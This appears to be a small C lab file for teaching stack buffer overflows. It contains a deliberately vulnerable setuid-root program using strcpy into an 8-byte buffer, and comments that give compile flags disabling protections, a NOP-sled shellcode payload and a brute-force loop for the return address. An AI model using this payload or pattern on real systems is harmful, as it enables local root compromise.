// AFTER => bof7.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// COMPILE $ gcc -z execstack -fno-stack-protector bof8.c -o bof8
// SETUID  $ sudo chown root:root bof8
//         $ sudo chmod 4755 bof8
// EXPLOIT $ export SHELLCODE=`python -c "print '\x90'*130000 + '\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81'"`
//         $ while : ; do ./bof8 `python -c "print 'a'*20 + '\x36\x4c\xc6\xff'"`; done

void vuln(char * arg) {
    char buf[BUF_SIZE];

    if (setuid(0)) {
        perror("setuid");
        return 1;
    }
    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main(int argc, char *argv[]) {
    vuln(argv[1]);
    return 0;
}

